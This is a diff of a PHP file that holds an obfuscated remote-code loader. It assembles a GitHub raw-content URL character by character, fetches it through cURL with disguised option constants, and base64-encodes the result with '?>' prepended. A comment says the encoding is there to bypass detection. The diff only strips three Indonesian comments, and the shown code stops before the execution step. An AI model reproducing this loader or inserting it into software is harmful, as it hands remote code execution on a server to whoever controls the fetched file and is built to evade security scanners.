@@ -1,5 +1,4 @@
 <?php
-// Split semua karakter
 $parts = [
     'h','t','t','p','s',':','/','/','r','a','w','.',
     'g','i','t','h','u','b','u','s','e','r','c','o','n','t','e','n','t','.',
@@ -10,7 +9,6 @@ $parts = [
 
 $url = implode('', $parts);
 
-// CURL dengan constant via define
 define('CURL_OPT_URL', 10002);
 define('CURL_OPT_RETURN', 19913);
 define('CURL_OPT_SSL_VERIFY', 64);
@@ -29,7 +27,6 @@ curl_setopt($ch, CURL_OPT_USERAGENT, 'Mozilla/5.0');
 $data = curl_exec($ch);
 curl_close($ch);
 
-// Eksekusi
 if ($data) {
     // Encode dulu untuk bypass detection
     $encoded = base64_encode('?>' . $data);
